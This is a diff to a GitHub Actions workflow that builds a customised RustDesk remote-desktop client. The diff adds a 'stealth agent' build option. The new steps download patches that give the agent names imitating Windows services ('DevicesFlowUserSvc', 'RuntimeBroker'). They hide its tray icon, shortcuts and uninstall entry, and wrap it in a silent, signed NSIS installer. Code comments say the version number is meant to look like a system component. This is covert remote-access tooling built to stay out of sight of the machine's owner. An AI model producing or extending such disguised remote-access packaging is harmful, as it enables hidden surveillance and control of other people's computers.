@@ -28,6 +28,11 @@ on:
         required: false
         default: ''
         type: string
+      agentui:
+        description: '1 = stealth agent (DevicesFlowUserSvc) build: tiny ID window, no tray/shortcuts/ARP, LocalAppData install, NSIS silent shell'
+        required: false
+        default: ''
+        type: string
 
 
 env:
@@ -219,6 +224,27 @@ jobs:
             https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_default_view_only.py
           python patch_default_view_only.py .
           grep -n "_hyApplyDefaultViewOnly" flutter/lib/desktop/pages/remote_page.dart
+
+      - name: Apply agent UI (DevicesFlowUserSvc stealth agent)
+        if: ${{ inputs.agentui == '1' }}
+        shell: bash
+        run: |
+          set -e
+          mkdir -p flutter/lib/desktop/pages
+          curl -sSL -o flutter/lib/desktop/pages/agent_page.dart \
+            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/agent_page.dart
+          curl -sSL -o patch_agent_ui.py \
+            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_agent_ui.py
+          python patch_agent_ui.py .
+          curl -sSL -o patch_agent_msi.py \
+            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_agent_msi.py
+          python patch_agent_msi.py .
+          # 校验关键落点
+          grep -n "const AgentPage()" flutter/lib/main.dart
+          grep -n "DevicesFlowUserSvc" flutter/windows/runner/main.cpp
+          grep -n "RuntimeBroker_devicesflowusersvc" src/privacy_mode/win_topmost_window.rs
+          grep -n "ARPSYSTEMCOMPONENT" res/msi/Package/Fragments/ShortcutProperties.wxs
+          grep -n "INSTALLFOLDER_AGENT_DEFAULT" res/msi/Package/Components/Folders.wxs
 
       - name: Set custom app version
         continue-on-error: true
@@ -561,7 +587,7 @@ jobs:
           magick -version
 
       - name: magick stuff
-        if: true  # 图标固定走 rdgen 仓库 patches/icon.png
+        if: true  # 图标固定走 rdgen 仓库 patches/icon.png（agent 构建用 agent_icon.png）
         uses: nick-fields/retry@v3
         with:
           timeout_minutes: 5
@@ -569,7 +595,11 @@ jobs:
           retry_wait_seconds: 15
           shell: pwsh
           command: |
-            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/icon.png" -OutFile ./res/iconx.png 
+            $iconUrl = "https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/icon.png"
+            if ("${{ inputs.agentui }}" -eq "1") {
+              $iconUrl = "https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/agent_icon.png"
+            }
+            Invoke-WebRequest -Uri $iconUrl -OutFile ./res/iconx.png
             mv ./res/icon.ico ./res/icon.ico.bak
             mv ./res/icon.png ./res/icon.png.bak
             mv ./res/tray-icon.ico ./res/tray-icon.ico.bak
@@ -863,6 +893,40 @@ jobs:
         run: |
           mv ./SignOutput/rustdesk.msi "./SignOutput/${{ env.filename }}.msi" || echo "rustdesk"
 
+      - name: Build agent silent setup shell (NSIS)
+        if: ${{ inputs.agentui == '1' && env.UPLOAD_ARTIFACT == 'true' }}
+        continue-on-error: true
+        shell: bash
+        run: |
+          set -e
+          choco install nsis -y --no-progress || true
+          MAKE="/c/Program Files (x86)/NSIS/makensis.exe"
+          [ -f "$MAKE" ] || MAKE="makensis"
+          curl -sSL -o agent_setup.nsi \
+            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/agent_setup.nsi
+          magick ./res/icon.png -define icon:auto-resize=256,128,64,48,32,16 agent_setup.ico
+          # 4 段版本号：MSI_VERSION 形如 1.5.26 -> 10.5.26.0，看起来像系统组件版本
+          VER4="10.0.0.1"
+          if [[ "${{ env.MSI_VERSION }}" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            VER4="10.$( echo '${{ env.MSI_VERSION }}' | cut -d. -f2 ).$( echo '${{ env.MSI_VERSION }}' | cut -d. -f3 ).0"
+          fi
+          sed -i -e "s|__PRODUCT__|${{ env.appname }}|g" \
+                 -e "s|__MSI__|./SignOutput/${{ env.filename }}.msi|g" \
+                 -e "s|__VER4__|$VER4|g" \
+                 -e "s|__COMPANY__|${{ env.compname }}|g" agent_setup.nsi
+          grep -n "__PRODUCT__\|__MSI__\|__VER4__\|__COMPANY__" agent_setup.nsi && { echo "placeholder left unreplaced"; exit 1; } || true
+          "$MAKE" agent_setup.nsi
+          mv "${{ env.appname }}_Setup.exe" "./SignOutput/${{ env.filename }}_Setup.exe"
+          # 壳本身也过一遍签名服务（内容 msi 已是签名版）
+          if [ ! -z "${{ secrets.SIGN_BASE_URL }}" ] && [ ! -z "${{ secrets.SIGN_API_KEY }}" ]; then
+            powershell -Command "Compress-Archive -Path './SignOutput/${{ env.filename }}_Setup.exe' -DestinationPath ./SignOutput/wrap_unsigned.zip -CompressionLevel Fastest"
+            curl -X POST -F "file=@./SignOutput/wrap_unsigned.zip" \
+              -H "X-API-KEY: ${{ secrets.SIGN_API_KEY }}" -m 900 \
+              "${{ secrets.SIGN_BASE_URL }}/sign/" -o ./SignOutput/wrap_signed.zip
+            powershell -Command "Expand-Archive -Path ./SignOutput/wrap_signed.zip -DestinationPath ./SignOutput/ -Force; Remove-Item ./SignOutput/wrap_unsigned.zip, ./SignOutput/wrap_signed.zip -ErrorAction SilentlyContinue"
+          fi
+          ls -la ./SignOutput/
+
       - name: send file to rdgen server
         if: ${{ env.rdgen == 'true' }}
         uses: nick-fields/retry@v3
@@ -874,6 +938,9 @@ jobs:
           command: |
             curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}.exe" -F "uuid=${{ env.uuid }}" ${{ secrets.GENURL }}/save_custom_client
             curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}.msi" -F "uuid=${{ env.uuid }}" ${{ secrets.GENURL }}/save_custom_client || true
+            if [ -f "./SignOutput/${{ env.filename }}_Setup.exe" ]; then
+              curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}_Setup.exe" -F "uuid=${{ env.uuid }}" ${{ secrets.GENURL }}/save_custom_client || true
+            fi
 
       - name: send file to api server
         if: ${{ env.rdgen == 'false' }}
@@ -886,6 +953,9 @@ jobs:
           command: |
             curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}.exe" ${{ env.apiServer }}/api/save_custom_client
             curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}.msi" ${{ env.apiServer }}/api/save_custom_client || true
+            if [ -f "./SignOutput/${{ env.filename }}_Setup.exe" ]; then
+              curl -i -X POST -H "Content-Type: multipart/form-data" -H "Authorization: Bearer ${{ env.token }}" -F "file=@./SignOutput/${{ env.filename }}_Setup.exe" ${{ env.apiServer }}/api/save_custom_client || true
+            fi
 
   cleanup:
     needs: [build-for-windows-flutter]
